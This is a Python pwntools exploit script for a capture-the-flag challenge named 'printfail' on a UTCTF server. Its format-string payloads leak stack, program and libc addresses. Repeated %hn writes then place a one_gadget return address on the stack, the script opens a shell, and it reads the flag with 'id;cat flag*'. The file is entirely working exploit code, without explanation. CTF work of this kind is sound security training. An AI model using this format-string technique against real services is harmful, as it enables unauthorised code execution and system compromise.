#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("printfail_patched")
libc = ELF("./libc-2.31.so")

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


host, port = "puffer.utctf.live", "4630"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

# leak values from stacks, stack,exe,libc
payload1 = '%8$p.%4$p.%13$p.%7$hhn'
sla('overs.\n', payload1)
stack = int(rcu("0x" , "."),16)
logleak('stack', stack)
exe.address = int(rcu("0x" , "."),16)-0x4040
logleak('prog base', exe.address)
libc.address = int(rcu("0x" , "."),16)-0x24083
logbase()

onegadgets = one_gadget(libc.path, libc.address)
myrop = p64(onegadgets[1])

# write rop to libc main return address on stack
for i in range(len(myrop)>>1):
  print('writing word: '+str(i))
  # first write address to pos 43 (argv[0]) on stack
  target = (stack-5)+(i*2)
  payload2 = '%c'*13+'%'+str(target & 0xffff)+'c%hn%7$hhnPIPO'
  sla('chance.\n', payload2)
  p.recvuntil('PIPO',drop=True)

  # then write value to address in pos 43
  value = u16(myrop[i*2:(i*2)+2])
  if (value):
    payload3 = '%'+str(value)+'c%43$hn%7$nPOPI'
  else:
    payload3 = '%43$hn%c%7$hnPOPI'
  sla('chance.\n', payload3)
  p.recvuntil('POPI',drop=True)


p.sendline('p')
# now we got shell

sl('id;cat flag*')

p.interactive()

